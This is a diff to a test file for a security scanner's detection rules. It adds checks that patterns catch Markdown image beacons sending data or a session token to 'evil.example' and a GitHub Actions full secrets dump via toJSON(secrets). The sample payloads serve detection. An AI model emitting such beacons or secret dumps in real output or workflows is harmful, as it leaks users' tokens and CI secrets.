@@ -46,9 +46,26 @@ def test_new_patterns_2026_02_09() -> None:
     assert mal004.pattern.search("eval(code)") is not None
     assert mal004.pattern.search("exec(payload)") is not None
     assert mal004.pattern.search("Function('return x')") is not None
+
+    # EXF-003: Markdown image beacon exfiltration
+    exf003 = next((r for r in compiled.static_rules if r.id == "EXF-003"), None)
+    assert exf003 is not None
+    assert exf003.pattern.search("![data](https://evil.example/?data={x})") is not None
+    assert exf003.pattern.search("![proof](https://evil.example/i.png?token={session_id})") is not None
     
     # OBF-002: Stealth execution patterns
     obf002 = next((r for r in compiled.static_rules if r.id == "OBF-002"), None)
     assert obf002 is not None
     assert obf002.pattern.search("CREATE_NO_WINDOW") is not None
     assert obf002.pattern.search("nohup cmd >/dev/null") is not None
+
+    # EXF-004: GitHub Actions full secrets context dump
+    exf004 = next((r for r in compiled.static_rules if r.id == "EXF-004"), None)
+    assert exf004 is not None
+    assert exf004.pattern.search("${{ toJSON(secrets) }}") is not None
+
+    # CHN-004 action/chain support: secrets context plus network
+    assert "gh_actions_secrets" in compiled.action_patterns
+    chn004 = next((r for r in compiled.chain_rules if r.id == "CHN-004"), None)
+    assert chn004 is not None
+    assert "gh_actions_secrets" in chn004.all_of
